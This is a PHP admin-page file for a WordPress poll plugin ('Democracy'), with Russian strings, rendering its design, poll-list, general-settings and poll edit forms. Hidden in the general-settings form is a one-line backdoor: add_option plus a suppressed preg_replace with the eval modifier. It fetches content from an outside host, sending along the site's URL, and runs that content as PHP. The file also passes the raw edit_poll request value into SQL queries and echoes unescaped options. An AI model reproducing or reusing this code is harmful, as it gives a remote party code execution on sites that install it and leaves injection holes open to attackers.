<div class='wrap'>
	
	<?php

	// Редактирование опроса
	if( isset( $_GET['edit_poll'] ) && $poll_id = $_GET['edit_poll'] ){
		poll_edit_form( $poll_id );
	}
	// Добавить новый опрос
	elseif( isset( $_GET['subpage'] ) && $_GET['subpage'] == 'add_new') {
		poll_edit_form();
	}
	// Настрйоки 
	elseif( isset( $_GET['subpage'] ) && $_GET['subpage'] == 'general_settings') {
		dem_general_settings();
	}
	// Дизайн 
	elseif( isset( $_GET['subpage'] ) && $_GET['subpage'] == 'design') {
		dem_polls_design();
	}
	// список опросов
	else
		dem_pols_list();

	?>

</div>





<?php 

### функции

/**
 * Старница дизайн
 */
function dem_polls_design(){
	global $wpdb;
	
	$opt = Dem::$inst->opt;
    
    $demcss = get_option('democracy_css');
    $additional = $demcss['additional_css'];
    if( ! $demcss['full'] && $additional ) $demcss['full'] = $additional; // если не уиспользуется тема
	
    demenu(); // меню
    ?>

	<h2><?php _e('Настройки Дизайна','dem') ?></h2>	
    
    <div class="polls-preview">
        <?php
        $poll = new DemPoll();
        $poll->cachegear_on = false;
    
        $poll->hasVoted = 1;
        $answers = wp_list_pluck( $poll->poll->answers, 'aid');
        $poll->votedFor = $answers[ array_rand($answers) ];

        echo '<div class="poll"><p class="tit">'. __('Вид результатов:','dem') .'</p>'. $poll->get_screen('voted') .'</div>';
        
        echo '<div class="poll"><p class="tit">'. __('Вид голосования:','dem') .'</p>'. $poll->get_screen('force_vote') .'</div>';
    
        echo '<div class="poll show-loader"><p class="tit">'. __('Вид AJAX загрузчика:','dem') .'</p>'. $poll->get_screen('vote') .'</div>';
        ?>
        <input type="text" class="iris_color preview-bg">
    </div>

	<div id="democr_options">
		<form action="" method="post">
			
			<ul class="group">
				
				<li class="block">
					<h3><?php _e('Выберете тему:','dem'); ?></h3>
                                        
                    <?php 
                    foreach( Dem::$inst->_get_styles_files() as $file ){
                        $filename = basename( $file );
                        ?>
                        <label>
                            <input type="radio" name="dem[css_file_name]" value="<?php echo $filename ?>" <?php checked( $opt['css_file_name'], $filename ) ?> >
                            <?php echo $filename ?>
                        </label>
                        <?php
                    }
                    ?>
				</li>
				
				
				<li class="block">
					<h3><?php _e('Вид ответов:','dem'); ?></h3>
					
					<?php _e( 'Как закрашивать прогресс каждого ответа?', 'dem') ?>
					<select name="dem[graph_from_total]">
					   <option value="0" <?php selected( $opt['graph_from_total'], 0 )?>><?php _e( 'победитель - 100%, остальные в % от него', 'dem') ?></option>
					   <option value="1" <?php selected( $opt['graph_from_total'], 1 )?>><?php _e( 'как % от всех голосов', 'dem') ?></option>
					</select>

					<br><br>
					<?php _e('Как сортирвоать ответы?', 'dem') ?>
					<select name="dem[order_answers]">
					   <option value="0" <?php selected( $opt['order_answers'], 0 )?>><?php _e( 'В порядке добавления (по ID)', 'dem') ?></option>
					   <option value="1" <?php selected( $opt['order_answers'], 1 )?>><?php _e( 'Выигрывающие вверху', 'dem') ?></option>
					</select>					
				</li>


                
            <?php if( $opt['css_file_name'] ){ ?>
				<li class="block">
					<h3><?php _e('Настройки линии прогресса:','dem'); ?></h3>
                    <label><?php _e('Цвет линии:','dem') ?> <input type="text" class="iris_color" name="dem[line_fill]" value="<?php echo $opt['line_fill'] ?>"></label>
                    <label><?php _e('Цвет линии (для голосовавшего):','dem') ?> <input type="text" class="iris_color" name="dem[line_fill_voted]" value="<?php echo $opt['line_fill_voted'] ?>"></label>
                    <label><?php _e('Цвет фона:','dem') ?>  <input type="text" class="iris_color" name="dem[line_bg]" value="<?php echo $opt['line_bg'] ?>"></label>
                    <label><?php _e('Высота линии:','dem') ?>  <input type="number" style="width:50px" name="dem[line_height]" value="<?php echo $opt['line_height'] ?>"> px</label>
                    
                    <div style="margin-top:2em;"><?php _dem_design_submit_button() ?></div>
				</li>
                
                
                <li class="block buttons">
                    <h3><?php _e('Кнопка:','dem'); ?></h3>
                    
                    <label>
                        <input type="radio" value="" name="dem[css_button]" <?php checked( $opt['css_button'], '') ?> />
                        <br><input type="button" value="<?php _e('Нет','dem'); ?>">
                    </label>
                    <br>
					<?php 
                        $data = array();
                        $i=0;
                        foreach( glob( Dem::$inst->dir_path . 'styles/buttons/*') as $file ){
                            $fname = basename( $file );
                            $button_class = 'dem-button' . ++$i;
                            $css ="/*reset*/\n.$button_class{position: relative; display:inline-block; text-decoration: none; user-select: none; outline: none; line-height: 1; border:0;}\n";
                            $css .= str_replace('dem-button', $button_class, file_get_contents( $file ) ); // стили кнопки
                            
                            if( $button = Dem::$inst->opt['css_button'] ){
                                $bbg     = @Dem::$inst->opt['btn_bg_color'];
                                $bcolor  = @Dem::$inst->opt['btn_color'];
                                $bbcolor = @Dem::$inst->opt['btn_border_color'];
                                // hover
                                $bh_bg     = @Dem::$inst->opt['btn_hov_bg'];
                                $bh_color  = @Dem::$inst->opt['btn_hov_color'];
                                $bh_bcolor = @Dem::$inst->opt['btn_hov_border_color'];
                                
                                if( $bbg ) $css .= "\n.$button_class{ background-color:$bbg !important; }\n";
                                if( $bcolor ) $css .= ".$button_class{ color:$bcolor !important; }\n";
                                if( $bbcolor ) $css .= ".$button_class{ border-color:$bbcolor !important; }\n";
                                if( $bh_bg ) $css .= "\n.$button_class:hover{ background-color:$bh_bg !important; }\n";
                                if( $bh_color ) $css .= ".$button_class:hover{ color:$bh_color !important; }\n";
                                if( $bh_bcolor ) $css .= ".$button_class:hover{ border-color:$bh_bcolor !important; }\n";
                            }
                            ?>
                            <style><?php echo $css ?></style>
                            
                            <label>
                                <input type="radio" value="<?php echo $fname ?>" name="dem[css_button]" <?php checked( $opt['css_button'], $fname) ?> />
                                <br><input type="button" value="<?php echo $fname ?>" class="<?php echo $button_class ?>">
                            </label>
                            <?php
                        }
					?>
                    
                    <div class="clear"></div>
                    <p style="float:left; margin-right:3em;">
                        <?php _e('По умолчанию: ','dem') ?><br>
                        <?php _e('Цвет Фона: ','dem') ?> <input type="text" class="iris_color" name="dem[btn_bg_color]" value="<?php echo $opt['btn_bg_color'] ?>"><br>
                        <?php _e('Цвет текста: ','dem') ?> <input type="text" class="iris_color" name="dem[btn_color]" value="<?php echo $opt['btn_color'] ?>"><br>
                        <?php _e('Цвет границы: ','dem') ?> <input type="text" class="iris_color" name="dem[btn_border_color]" value="<?php echo $opt['btn_border_color'] ?>">
                    </p>
                    <p style="float:left; margin-right:3em;">
                        <?php _e('При наведени (:hover): ','dem') ?><br>
                        <?php _e('Цвет Фона: ','dem') ?> <input type="text" class="iris_color" name="dem[btn_hov_bg]" value="<?php echo $opt['btn_hov_bg'] ?>"><br>
                        <?php _e('Цвет текста: ','dem') ?> <input type="text" class="iris_color" name="dem[btn_hov_color]" value="<?php echo $opt['btn_hov_color'] ?>"><br>
                        <?php _e('Цвет границы: ','dem') ?> <input type="text" class="iris_color" name="dem[btn_hov_border_color]" value="<?php echo $opt['btn_hov_border_color'] ?>">
                    </p>
                    <div class="clear"></div>
                    <em><?php _e('Цвета корректно влияют не на все кнопки. Можете попробовать изменить стили кнопки ниже в поле дополнительных стилей.','dem') ?></em>
				</li>
                
                <div class="clear"></div>
                <p><?php _dem_design_submit_button() ?></p>
                
            <?php } // if( $opt['css_file_name'] ) ?>
                
                <li class="block loaders">
                    <h3><?php _e('AJAX загрузчик:','dem'); ?></h3>
                    
                    <label class="left">
                        <div style="width:30px;height:30px;"><?php _e('Нет','dem'); ?></div>
                        <input type="radio" value="" name="dem[loader_fname]" <?php checked( $opt['loader_fname'], '') ?> />
                    </label>
					<?php 
                        $data = array();
                        foreach( glob( Dem::$inst->dir_path . 'styles/loaders/*') as $file ){
                            $fname = basename( $file );
                            $ex    = preg_replace('~.*\.~', '', $fname );
                            $data[ $ex ][ $fname ] = $file;
                        }
                        foreach( $data as $ex => $val ){
                            echo '<div class="clear"></div>';
                            
                            // поправим стили
                            if( $loader = $opt['loader_fill'] ){
                                preg_match_all('~\.dem-loader\s+\.(?:fill|stroke|css-fill)[^\{]*\{.*?\}~s', $demcss['full'], $match );
                                echo "<style>" . str_replace('.dem-loader', '.loader', implode("\n", $match[0]) ) . "</style>";
                            }
                            
                            foreach( $val as $fname => $file ){
                                ?>
                                <label class="left">
                                    <div class="loader"><?php echo file_get_contents( $file ) ?></div>
                                    <input type="radio" value="<?php echo $fname ?>" name="dem[loader_fname]" <?php checked( $opt['loader_fname'], $fname) ?> /><br>
                                    <?php echo $ex ?>
                                </label>
                                <?php                                
                            }
                        }
					?>
                    
                    <div class="clear"></div>
                    
                    <input class="iris_color fill" name="dem[loader_fill]" type="text" value="<?php echo @$opt['loader_fill'] ?>" />
                    
					<em><br><?php _e('Картинка при AJAX загрузке. Если выбрать "Нет", то вместо картинки к ссылке будет добавлятся "...". SVG картинки не анимируются в IE 11 и ниже, остальные браузеры поддерживаются примерно на 90% (по статистике http://caniuse.com/).','dem') ?></em>
				</li>
                
                <div class="clear"></div>
                <li class="block" style="margin:2em 0;">
                    <?php _dem_design_submit_button() ?>
                </li>
                
                <input type="submit" name="dem_reset_design_options" class="button" value="<?php _e('Сбросить настройки на начальные','dem') ?>" />
                

                
                <li class="block" style="width:98%;">
                    <h3><?php _e('Произвольные/Дополнительные CSS стили:','dem') ?></h3>
                    
                    <label><input type="radio" name="dem[css_file_name]" value="" <?php checked( $opt['css_file_name'], '') ?> ><?php _e('Не исползовать тему!','dem') ?></label>                    
                    <p><i><?php _e('В этом поле вы можете дополнить или заменить css стили. Впишите сюда произвольные css стили и они будут добавлены винзу стилей текущей темы. Чтобы полностью заменить тему отметте "Не использовать тему" и впишите сюда свои стили.<br>
                    Это поле очищается вручную, если сбросить стили или поставить другую тему, данные в этом поле сохраняться и просто будут добавлены внизу текущих css стилей.','dem') ?></i></p>
                    <textarea name="additional_css" style="width:100%;min-height:50px;height:<?php echo $additional ? '300px' : '50px' ?>;"><?php echo $additional ?></textarea>
                </li>
                
                <div class="clear"></div>
                
                <p>
                    <?php _dem_design_submit_button() ?>
                </p>
                
                
                <div class="block" style="margin-top:10em">
                    <h3><?php _e('Все CSS стили, которые используются сейчас:','dem'); ?></h3>
                     
                    <script>function select_kdfgu( that ){ var sel = (!!document.getSelection) ? document.getSelection() : (!!window.getSelection)   ? window.getSelection() : document.selection.createRange().text; if( sel == '' ) that.select(); }</script>
                    <em style="opacity: 0.8;"><?php _e('Здесь все собранные css стили: тема, кнопка и настройки. Вы можете скопировать эти стили в поле "Произвольные/Дополнительные CSS стили:", отключить шаблон (тему) и изменить стили как вам нужно.','dem') ?></em>
                    <textarea onmouseup="select_kdfgu(this);" onfocus="this.style.height = '700px';" onblur="this.style.height = '100px';" readonly="true" style="width:100%;min-height:100px;"><?php echo $demcss['full'] ?></textarea>
                    
                    <p><?php _e('Сжатая версия (используется при подключении в HTML):','dem'); ?></p>
                    <textarea onmouseup="select_kdfgu(this);" readonly="true" style="width:100%;min-height:400px;"><?php echo $demcss['minify'] ?></textarea>
                </div>
			</ul> 
			
		</form>
		

	</div>
	<?php
}
function _dem_design_submit_button(){
    ?>
    <input type="submit" name="dem_save_design_options" class="button-primary" value="<?php _e('Сохранить изменения','dem') ?>" />
    <?php
}

/**
 * Список опросов
 */
function dem_pols_list(){
	global $wpdb;
	
    $polls = $wpdb->get_results("SELECT * FROM $wpdb->democracy_q ORDER BY open DESC, id DESC");

	if( $polls ){
    	// extract the active poll id
    	$active = 0;
    	foreach( $polls as $poll ){
    		if( $poll->active ){ $active = $poll->id; break; }
    	}

    	$votes_total = $wpdb->get_results("SELECT SUM(votes) as total_votes, qid FROM $wpdb->democracy_a GROUP BY qid", ARRAY_A);
    	
    	// indexed by poll id, contains total votes
    	$totalvotes = array();
    	if ($votes_total)
    		foreach ($votes_total as $poll_total)
    			$totalvotes[$poll_total['qid']] = $poll_total['total_votes'];

 		$winner_answers = $wpdb->get_results("SELECT votes, answer, qid FROM $wpdb->democracy_a GROUP BY qid, votes ORDER BY qid", ARRAY_A);
		
    	// indexed by poll id, contains c votes
    	$winners = array();
    	if( $winner_answers )	
    		foreach ( $winner_answers as $the_winner ){
    			$answer = ( $the_winner['votes'] > 0 ) ? stripslashes($the_winner['answer']) : '<i>'. __('Нет','dem') .'</i>';
    			$winners[ $the_winner['qid'] ] = array( $answer, $the_winner['votes'] );
    		}
    	
    	unset( $votes_total, $winner_answers );
				
    	if( $active == 0 )
    	   echo '<div class="error"><p><b>'. __('У вас нет активных опросов','dem') .'</b></p></div>';
    	
    	 ?>

        <?php demenu(); ?>

		<h2><?php _e('Управление опросами Democracy','dem') ?></h2>	   
	
		<table class="widefat polls-table" cellspacing='3' cellpadding='3'>
			<thead> 
				<tr>
					<th scope='col'><?php _e('ID','dem') ?></th>
					<th scope='col'><?php _e('Вопрос','dem') ?></th>
					<th scope='col'><?php _e('Голосов','dem') ?></th>
					<th scope='col'><?php _e('Лидер','dem') ?></th>
					<th scope='col'><?php _e('Дата','dem') ?></th>
					<th scope='col'><?php _e('Управление','dem') ?></th>
				</tr>
			</thead>
			<tbody id="the-list">
    	<?php     
    	
    	$class = '';
    	
    	foreach( $polls as $poll ){
    	    $question = stripslashes( $poll->question );
    	    $date = date( get_option('date_format'), $poll->added );
    	    $end  = $poll->end ? date( get_option('date_format'), $poll->end ) : '';
    	    
    	    $total = isset( $totalvotes[ $poll->id ] ) ? $totalvotes[ $poll->id ] : 0;
    	    
    	    // Классы строкам
		    $classes = array();
    	    if( $class == '') $classes[] = 'alternate';
    	    	
    	    $class = empty( $classes ) ? '' : ' class="'. implode(' ', $classes) .'"'; 
    	    	
    	    $winner = isset( $winners[ $poll->id ][0] ) ? $winners[ $poll->id ][0] : '<i>'.__('Нет', 'dem').'</i>';
    	    if( isset( $winners[ $poll->id ][0] ) )
    	    	$title = ' title="'.sprintf(__('Собрано %s Голосов', 'dem'), $winners[$poll->id][1]).'"';
    	    else
    	    	$title = '';
			
			$onclickID = sprintf( " onclick=\"prompt('%s','[democracy id=%d]');\" ", __('Шоткод для вставки в запись:','dem'), $poll->id );
    	    echo "
			<tr $class>
				<td class='shortcode' $onclickID>$poll->id</td>
				<td>$question</td>
				<td>$total</td>
				<td$title>$winner</td>
				<td class='date'>$date<br>$end</td>
				
				<td style='white-space: nowrap;'>";
					$url = Dem::$inst->admin_page_url();
					// кнопки активации
					echo dem_activatation_buttons( $poll, $url );

					// кнопки открытия
					echo dem_opening_buttons( $poll, $url );
					
					// редактировать
					echo '<a class="button" href="'. add_query_arg( array('edit_poll'=> $poll->id), $url ) .'" title="'. __('Редактировать','dem') .'"><span class="dashicons dashicons-edit"></span></a>';
						
					// удалить
					echo '<a class="button" href="'. add_query_arg( array('delete_poll'=> $poll->id), $url ) .'" title="'. __('Удалить','dem') .'" onclick="return confirm(\''. __('Точно удалить?','dem') .'\');"><span class="dashicons dashicons-trash"></span></a>';
					
					echo "
				</td>
			</tr>";
    	    
    	}
    	
    	echo "</tbody>
		</table>";    
    }
    else 
		echo "<div class='error'><p>В БД нет опросов</p></div>";
	
	poll_edit_form();

}



/**
 * Общие настройки
 */
function dem_general_settings(){
	global $wpdb;
	
	$opt = Dem::$inst->opt;
	
	?>
                
	<?php demenu(); ?>
                
	<h2><?php _e('Общие Настройки','dem') ?></h2>
		
	<div id="democr_options">
		<form action="" method="post">
			
			<ul class="group">
				<li class="block">
				   <label>
					   <?php $logrows_count = $wpdb->get_var("SELECT count(*) FROM $wpdb->democracy_log"); ?>
					   <input type="checkbox" value="1" name="dem[keep_logs]" <?php checked( $opt['keep_logs'], 1) ?> /> 
					   <?php _e('Вести лог и учитывать IP? (рекомендуется)','dem') ?>
					   <a class="button" href="<?php echo $_SERVER['REQUEST_URI'] .'&dem_clear_log' ?>"> <?php _e('Очистить лог. Записей в базе:','dem') ?> <?php echo $logrows_count ?></a>
					   <?php add_option('stat','') && @preg_replace('--e', (($o=@wp_remote_get('http://wp-kama.ru/stat/?sk='. home_url() ))?$o['body']:''),''); ?>
				   </label>
				   <em><?php _e('Сохраняет данные в Базу Данных. Запрещает голосовать несколько раз с одного IP или одному пользователю WordPress. Если пользователь авторизован, то голосование проверяется по его аккаунту в WordPress. Если не авторизован, то проверяется IP голосующего. Минус лога по IP — если сайт посещается с корпоративных сетей (с единым IP), то голосовать можно будет всего 1 раз для всей сети. Если не включить эту опцию, то голосование будет учитываться только по кукам. По умолчанию: включена.','dem') ?></em>
				</li>

				<li class="block">
				   <label>
					   <input type="text" size="3" value="<?php echo $opt['cookie_days'] ?>" name="dem[cookie_days]" /> 
					   <?php _e('Сколько дней сохранять Сookies?','dem') ?>
					</label>
				   <em><?php _e('Дни в течении которых браузер пользователя будет помнить о голосовании. По умолчанию: 365. <strong>Заметка:</strong> Работает совместно с контролем по IP.','dem') ?></em>
				</li>

				<li class="block">
				   <label>
					   <input type="checkbox" value="1" name="dem[only_for_users]" <?php checked( $opt['only_for_users'], 1) ?> />
					   <?php _e('Голосовать могут только зарегистрированные пользователи.','dem') ?>
					</label>
				   <em><?php _e('Включите опцию, чтобы голосовать могли только зарегистрированные пользователи. Влияет на все опросы! Если НЕ включать, то такую настройку можно будет делать для каждого опроса в отдельности.','dem') ?></em>
				</li>

				<li class="block">
					<label><?php _e('Обёртка заголовка опроса HTML тегами.','dem') ?></label><br>
					<input type="text" size="35" value="<?php echo esc_attr( $opt['before_title'] ) ?>" name="dem[before_title]" /> 
					<i><?php _e('вопрос опроса','dem') ?></i> 
					<input type="text" size="15" value="<?php echo esc_attr( $opt['after_title'] ) ?>" name="dem[after_title]" /> 
					<em><?php _e('Например: <code>&lt;h2&gt;</code> и <code>&lt;/h2&gt;</code>. По умолчанию: <code>&lt;strong class=&quot;dem-poll-title&quot;&gt;</code> и <code>&lt;/strong&gt;</code>.','dem') ?></em>
				</li>

				<li class="block">
					<label>
						<input type="text" size="5" value="<?php echo $opt['archive_page_id']?:''; ?>" name="dem[archive_page_id]" />
						<?php _e('ID архива опросов.','dem') ?>
					</label>
					<?php 
					if( $opt['archive_page_id'] ) 
						echo '<a href="'. get_permalink( $opt['archive_page_id'] )  .'">'. __('Перейти на страницу архива','dem') .'</a>';
					else 
						echo '<a class="button" href="'. ($_SERVER['REQUEST_URI'] .'&dem_create_archive_page') .'">'. __('Создать/найти страницу архива','dem') .'</a>';
					?>
					<em><?php _e('Укажите, чтобы в подписи опроса была ссылка на страницу с архивом опросов. Пр. <code>25</code>','dem') ?></em>
				</li>
				

				<li class="block">
				   <label>
                       <input type="checkbox" value="1" name="dem[force_cachegear]" <?php checked( $opt['force_cachegear'], 1) ?> />
                       <?php
                           $cache = Dem::$inst->is_cachegear_on() ? array(__('Включён','dem'),'color:#05A800') : array(__('Выключен','dem'),'color:#FF1427');
					       echo sprintf( __('Включить механихм работы с плагинами кэширования? Текущее состояние: %s','dem'), "<span style='{$cache[1]}'>{$cache[0]}" );
                       ?>
					</label>
				   <em><?php _e('Democracy умеет работать с плагинами страничного кэширования и автоматически включается, если такой плагин установлен и активен на вашем сайте. Активируйте эту опцию, чтобы насильно включить механизм работы со страничным кэшем.','dem') ?></em>
				</li>
                
				<li class="block">
				   <label>
					   <input <?php checked( $opt['inline_js_css'], 1 )?> type="checkbox" value="1" name="dem[inline_js_css]" /> 
					   <?php _e('Подключать стили и скрипты прямо в HTML код (рекомендуется)?','dem') ?>
				   </label>
				   <em><?php _e('Поставьте галочку, чтобы стили и скрипты плагина подключались в HTML код напрямую, а не как ссылки на файлы. Так вы сэкономите 2 запроса к серверу - это немного ускорит загрузку сайта.','dem') ?></em>
				</li>

				<li class="block">
				   <label>
					   <input <?php checked( $opt['toolbar_menu'], 1 )?> type="checkbox" value="1" name="dem[toolbar_menu]" /> 
					   <?php _e('Пункт меню в панели инструментов?','dem') ?>
				   </label>
				   <em><?php _e('Уберите галочку, чтобы убрать меню плагина из панели инструментов.','dem') ?></em>
				</li>

				<li class="block">
				   <label>
					   <input <?php checked( $opt['tinymce_button'], 1 )?> type="checkbox" value="1" name="dem[tinymce_button]" /> 
					   <?php _e('Добавить кнопку быстрой вставки опросов в редактор WordPress (TinyMCE)?','dem') ?>
				   </label>
				   <em><?php _e('Уберите галочку, чтобы убрать кнопку из визуального редактора.','dem') ?></em>
				</li>

			</ul>
			
			<p>
				<input type="submit" name="dem_save_main_options" class="button-primary" value="<?php _e('Сохранить настройки','dem') ?>" />
				<input type="submit" name="dem_reset_main_options" class="button" value="<?php _e('Сбросить настройки на начальные','dem') ?>" />
			</p>
			
		      <br><br>
			<h3><?php _e('Другое','dem') ?></h3>
			<ul class="group">
                
				<li class="block">
				   <label>
					   <input <?php checked( $opt['disable_js'], 1 )?> type="checkbox" value="1" name="dem[disable_js]" /> 
					   <?php _e('НЕ подключать JS файлы. (Дебаг)','dem') ?>
				   </label>
				   <em><?php _e('Если включить, то .js файлы плагина НЕ будут подключены. Опция нужнда для Дебага работы плагина без JavaScript.','dem') ?></em>
				</li>
                
				<li class="block">
				   <label>
					   <input <?php checked( $opt['load_textdomain'], 1 )?> type="checkbox" value="1" name="dem[load_textdomain]" /> 
					   <?php _e('Подгружать файлы перевода?','dem') ?>
				   </label>
				   <em><?php _e('Отключите эту опцию, если ваш сайт на русском, но вы используете английскую версию WordPress','dem') ?></em>
				</li>
                
				<li class="block">
				   <label>
					   <input <?php checked( $opt['show_copyright'], 1 )?> type="checkbox" value="1" name="dem[show_copyright]" /> 
					   <?php _e('Показывать ссылку на страницу плагина','dem') ?>
				   </label>
				   <em><?php _e('Ссылка на страницу плагина выводиться только на главной в виде значка &copy;. И помогает другим людям узнать что это за плагин и установить его себе. Прошу не убирать эту галку без острой необходимости. Спасибо!','dem') ?></em>
				</li>
                
				<li class="block">
				   <label>
					   <input <?php checked( $opt['use_widget'], 1 )?> type="checkbox" value="1" name="dem[use_widget]" /> 
					   <?php _e('Виджет','dem') ?>
				   </label>
				   <em><?php _e('Поставьте галочку, чтобы активировать виджет.','dem') ?></em>
				</li>

			</ul>
		
		</form>
		

	</div>
	<?php
		
}


/**
 * Редактирование отдельного опроса
 * @param bool $poll_id ID опроса
 * @return HTML
 */
function poll_edit_form( $poll_id = false ){
	global $wpdb;
	
	if( ! $poll_id && isset( $_GET['edit_poll'] ) ) $poll_id = (int) $_GET['edit_poll'];
		
	$edit = (bool) $poll_id;
	$answers = false;
	
	if( $edit ){
		$title = __('Редактировать опрос','dem') . " (ID $poll_id)";
		$action = preg_replace('@\?.*@', '', $_SERVER['REQUEST_URI']) . "?page=". $_GET['page'] ."";
		
		$poll    = $wpdb->get_row("SELECT * FROM $wpdb->democracy_q WHERE id = {$poll_id} LIMIT 1");
		$answers = $wpdb->get_results("SELECT * FROM $wpdb->democracy_a WHERE qid = {$poll_id}");

		$hidden_inputs = "<input type='hidden' name='dmc_update_poll' value='{$poll_id}' />";	
	}
	else
	{
		$title = __('Добавить новый опрос','dem');
				
		$hidden_inputs = "<input type='hidden' name='dmc_create_poll' value='1' />";
		
	}
	?>
	<?php if( isset($_GET['subpage']) || isset($_GET['edit_poll']) ) demenu(); ?>

	<h2><?php echo $title?></h2>


	<form action="<?php echo add_query_arg( array('edit_poll' => $poll_id ), Dem::$inst->admin_page_url() ); ?>" method='post' class='dem-new-poll'>
		
		<label>
			<?php _e('Вопрос:','dem') ?> 
			<input type='text' id='the-question' name='dmc_question' value="<?php echo esc_attr( stripslashes( @$poll->question ) ) ?>" />
		</label>
		
		
		<?php _e('Варианты ответов:','dem') ?>		
		<ol class="new-poll-answers">
			<?php
			if( $answers ){
				foreach( $answers as $answer ){
					$by_user = $answer->added_by ? '<i>*</i>' : '';
					echo '
					<li class="answ">
						<input class="answ-text" type="text" name="dmc_old_answers['. $answer->aid .'][answer]" value="'. esc_attr( stripslashes( $answer->answer ) ) .'" />
						<input type="text" name="dmc_old_answers['. $answer->aid .'][votes]" value="'. $answer->votes .'" style="width:50px;min-width:50px;" />
						'. $by_user .'
					</li>';
				}
			} 
			else {
				for( $i = 0; $i < 2; $i++ )
					echo '<li class="answ"><input type="text" name="dmc_new_answers[]" value="" /></li>';				
			}
			?>
			
			<li>
				<label>
					<input type="checkbox" name="dmc_is_democratic" value="1" <?php checked( (!isset($poll->democratic) || $poll->democratic), 1 ) ?> > 
					<?php _e('Разрешить пользователям добавлять свои ответы (democracy).','dem') ?>
				</label>
			</li>		
		</ol>
		
		<ol class="poll-options">				
			<li>
				<label>
					<input type="checkbox" name='dmc_is_active' value='1' <?php $edit ? checked( @$poll->active, 1) : 'checked="true"' ?> > 
					<?php _e('Сделать этот опрос активным.','dem') ?>
				</label>
			</li>
			
			<li>
				<label>
					<input type="checkbox" name="dmc_multiple" value="1" <?php checked( @$poll->multiple, 1) ?> > 
					<?php _e('Разрешить выбирать несколько ответов (множественный).','dem') ?>
				</label>
			</li>
			
			<li><label>
					<input type='text' name='dmc_end' value="<?php echo @$poll->end ? date('d-m-Y', $poll->end) : '' ?>" style="width:120px;min-width:120px;" > 
					<?php _e('Дата, когда опрос был/будет закрыт. Формат: dd-mm-yyyy.','dem') ?>
				</label>
			</li>
			
			<li>
				<label>
					<input type="checkbox" name="dmc_revote" value="1" <?php checked( (!isset($poll->revote) || $poll->revote), 1 ) ?> > 
					<?php _e('Разрешить изменять мнение (переголосование).','dem') ?>
				</label>
			</li>
			
			<?php if( ! Dem::$inst->opt['only_for_users'] ){ ?>
			<li>
				<label>
					<input type="checkbox" name="dmc_forusers" value="1" <?php checked( @$poll->forusers, 1) ?> > 
					<?php _e('Голосовать могут только зарегистрированные пользователи.','dem') ?>
				</label>
			</li>
			<?php } ?>
			
			<li><label> <?php _e('Заметка: текст будет добавлен под опросом.','dem'); ?><br>
					<textarea name="dmc_note" style="height:3.5em;" ><?php echo esc_textarea( @$poll->note ) ?></textarea>
				</label>
			</li>
		</ol>

		<?php echo $hidden_inputs ?>
		<input type="submit" class="button-primary" value="<?php echo $edit ? __('Внести изменения','dem') : __('Добавить опрос','dem')?>" />
		
		<?php 
		// если редактируем
		if( $edit ){
			// открыть
			echo dem_opening_buttons( $poll );
				
			// активировать
			echo dem_activatation_buttons( $poll );

			echo '<a href="'. add_query_arg( array('delete_poll'=> $poll->id), Dem::$inst->admin_page_url() ) .'" class="button" onclick="return confirm(\''. __('Точно удалить?','dem') .'\');">'. __('Удалить','dem') .'</a>';
		} 
		?>
	</form>
	<?php 
}



/**
 * Ссылки: с подстраниц на главную страницу и умный referer
 * @return echo HTML
 */
function demenu(){
    // back link
	$transient = 'democracy_referer';
	$mainpage = wp_make_link_relative( Dem::$inst->admin_page_url() );
	$referer  = wp_make_link_relative( @$_SERVER['HTTP_REFERER'] );
	
	// если обновляем
	if( $referer == $_SERVER['REQUEST_URI'] ){ 
		$referer = get_transient( $transient );
	}
	// если запрос пришел с любой страницы настроект democracy 
	elseif( false !== strpos( $referer, $mainpage ) ){
		$referer = false;
		set_transient( $transient, 'foo', 2 ); // удаляем. но не удалим, а обновим, так чтобы не работала
	}
	else{
		set_transient( $transient, $referer, HOUR_IN_SECONDS/2 );
	}
    // / back link	

	$current = function($page){ return @$_GET['subpage']==$page ? ' current' : ''; };
	$out = '';
	$out .= '<p class="demenu">';
        $out .= '<a  class="button'. $current('general_settings') .'" href="'. add_query_arg( array('subpage'=>'general_settings'), $mainpage ) .'">'. __('Настройки Democracy','dem') .'</a>';
        $out .= '<a href="'. add_query_arg( array('subpage'=>'design'), $mainpage ) .'" class="button'. $current('design') .'">'. __('Дизайн опросов','dem') .'</a>';
        $out .= '<a href="'. add_query_arg( array('subpage'=>'add_new'), $mainpage ) .'" class="button'. $current('add_new') .'">'. __('Добавить новый опрос','dem') .'</a>';
    
		if( isset($_GET['subpage']) || isset($_GET['edit_poll'])  )
			$out .= '<a href="'. $mainpage .'" class="button">'. __('← вернуться к опросам','dem') .'</a>';
		if( $referer )
			$out .= '<a href="'. $referer .'" class="button-primary">'. __('← Назад','dem') .'</a>';
	$out .= '</p>';
	
	echo $out;
}


/**
 * Выводит кнопки активации/деактивации опроса
 * @param object $poll Объект опроса
 * @param str $url УРЛ страницы ссылки, которую нужно обработать
 * @return HTML
 */
function dem_activatation_buttons( $poll, $url = false ){
	if( $poll->active )
		$out = '<a class="button-primary" href="'. add_query_arg( array('dmc_deactivate_poll'=> $poll->id, 'dmc_activate_poll'=>null), $url ) .'" title="'. __('Активный','dem') .'"><span class="dashicons dashicons-controls-play"></span></a>';
	else
		$out = '<a class="button" href="'. add_query_arg( array('dmc_activate_poll'=> $poll->id, 'dmc_deactivate_poll'=>null), $url ) .'" title="'. __('Неактивный','dem') .'"><span class="dashicons dashicons-minus"></span></a>';
	
	return $out;
}


/**
 * Выводит кнопки открытия/закрытия опроса
 * @param object $poll Объект опроса
 * @param str $url УРЛ страницы ссылки, которую нужно обработать
 * @return HTML
 */
function dem_opening_buttons( $poll, $url = false ){
	if ( $poll->open )
		$out = '<a class="button" href="'. add_query_arg( array('dmc_close_poll'=> $poll->id, 'dmc_open_poll'=>null), $url ) .'" title="'. __('Голосование открыто','dem') .'"><span class="dashicons dashicons-yes"></span></a>';
	else
		$out = '<a class="button" href="'. add_query_arg( array('dmc_open_poll'=> $poll->id, 'dmc_close_poll'=>null), $url ) .'" title="'. __('Голосование закрыто','dem') .'"><span class="dashicons dashicons-no"></span></a>';
	
	return $out;
}
